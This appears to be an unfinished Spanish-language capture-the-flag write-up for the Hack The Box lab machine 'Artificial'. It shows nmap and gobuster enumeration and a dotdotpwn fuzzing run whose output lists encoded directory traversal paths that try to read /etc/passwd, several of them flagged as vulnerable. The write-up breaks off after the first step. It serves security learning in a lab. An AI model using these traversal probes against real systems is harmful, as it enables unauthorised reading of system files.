# HTB: Artificial

## Host: Linux
## IP: 10.10.11.74

## Procedimiento y comandos
#### Paso 1: Enumeracion

* Nmap

```bash
  cat Artificial-nmap.txt  
# Nmap 7.95 scan initiated Mon Sep  8 15:46:08 2025 as: /usr/lib/nmap/nmap -A -oN Artificial-nmap.txt 10.10.11.74
Nmap scan report for 10.10.11.74
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   162.45 ms 10.10.14.1
2   162.54 ms 10.10.11.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  8 15:46:25 2025 -- 1 IP address (1 host up) scanned in 17.37 seconds
```

* Gobuster

```bash
  gobuster dir -u http://artificial.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k    

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://artificial.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 857]
/register             (Status: 200) [Size: 952]
/logout               (Status: 302) [Size: 189] [--> /]
/dashboard            (Status: 302) [Size: 199] [--> /login]
```

* Probamos Directory Traversal

```bash
  dotdotpwn -m http -h 10.10.11.74 -x 80 -M GET -o linux -d 10
#################################################################################
#                                                                               #
#  CubilFelino                                                       Chatsubo   #
#  Security Research Lab              and            [(in)Security Dark] Labs   #
#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
#                                                                               #
#                               pr0udly present:                                #
#                                                                               #
#  ________            __  ________            __  __________                   #
#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
#          \/                      \/                                      \/   #
#                              - DotDotPwn v3.0.2 -                             #
#                         The Directory Traversal Fuzzer                        #
#                         http://dotdotpwn.sectester.net                        #
#                            dotdotpwn@sectester.net                            #
#                                                                               #
#                               by chr1x & nitr0us                              #
#################################################################################

[+] Report name: Reports/10.10.11.74_09-08-2025_16-58.txt

[========== TARGET INFORMATION ==========]
[+] Hostname: 10.10.11.74
[-] Invalid OS type "linux"... Using the previously detected by nmap (if -O enabled)
[-] Invalid OS type "linux"... Using the previously detected by nmap (if -O enabled)
[+] Protocol: http
[+] Port: 80

[=========== TRAVERSAL ENGINE ===========]
[+] Creating Traversal patterns (mix of dots and slashes)
[+] Multiplying 10 times the traversal patterns (-d switch)
[+] Creating the Special Traversal patterns
[+] Translating (back)slashes in the filenames
[+] Adapting the filenames according to the OS type detected (unix)

[+] Including Special sufixes
[+] Traversal Engine DONE ! - Total traversal tests created: 18380

[=========== TESTING RESULTS ============]
[+] Ready to launch 3.33 traversals per second
[+] Press Enter to start the testing (You can stop it pressing Ctrl + C)
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../etc/issue
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../etc/issue
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../etc/issue
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../etc/issue
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../etc/issue
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../../etc/issue                                                                                                                            
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../../../etc/passwd                                                                                                                        
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../../../etc/issue                                                                                                                         
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../../../../etc/passwd                                                                                                                     
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../../../../etc/issue                                                                                                                      
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../../../../../etc/passwd                                                                                                                  
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../../../../../etc/issue                                                                                                                   
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../../../../../../etc/passwd                                                                                                               
[*] HTTP Status: 400 | Testing Path: http://10.10.11.74:80/../../../../../../../../../../etc/issue                                                                                                                
                                                                                                                                                                                                                  
[*] Testing Path: http://10.10.11.74:80/..%5Cetc%5Cpasswd <- VULNERABLE!                                                                                                                                          
                                                                                                                                                                                                                  
[*] Testing Path: http://10.10.11.74:80/..%5Cetc%5Cissue <- VULNERABLE!                                                                                                                                           
                                                                                                                                                                                                                  
[*] Testing Path: http://10.10.11.74:80/..%5C..%5Cetc%5Cpasswd <- VULNERABLE!                                                                                                                                     
                                                                                                                                                                                                                  
[*] Testing Path: http://10.10.11.74:80/..%5C..%5Cetc%5Cissue <- VULNERABLE!                                                                                                                                      
                                                                                                                                                                                                                  
[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5Cetc%5Cpasswd <- VULNERABLE!                                                                                                                                
                                                                                                                                                                                                                  
[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5Cetc%5Cissue <- VULNERABLE!                                                                                                                                 
                                                                                                                                                                                                                  
[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5Cetc%5Cpasswd <- VULNERABLE!                                                                                                                           
                                                                                                                                                                                                                  
[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5Cetc%5Cissue <- VULNERABLE!                                                                                                                            

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5Cetc%5Cissue <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cissue <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cissue <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cissue <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cissue <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd <- VULNERABLE!

[*] Testing Path: http://10.10.11.74:80/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cissue <- VULNERABLE!
```

#### Paso 2: ...


